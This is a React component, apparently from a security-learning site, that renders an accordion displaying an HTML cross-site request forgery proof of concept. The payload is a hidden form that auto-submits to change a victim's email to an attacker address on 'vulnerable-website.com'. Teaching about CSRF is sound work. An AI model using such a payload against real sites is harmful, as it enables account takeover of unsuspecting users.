import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  
  interface IProps {
    title: string;
  }
  
  const CSRF_PoC = ({ title }: IProps) => {
    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
            <SyntaxHighlighter className="syntax" language="html">
              {"<html>\n"+
               "    <body>\n"+
               '        <form action="https://vulnerable-website.com/email/change" method="POST">\n'+
               '            <input type="hidden" name="email" value="pwned@evil-user.net" />\n'+
               '            <input type="hidden" name="csrf" value="WfF1szMUHhiokx9AHOfjRkE" />\n'+
               "        </form>\n"+
               "        <script>\n"+
               "            document.forms[0].submit();\n"+
               "        </script>\n"+
               "    </body>\n"+
               "</html>"}
            </SyntaxHighlighter>
            </Typography>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };
  
  export default CSRF_PoC;
  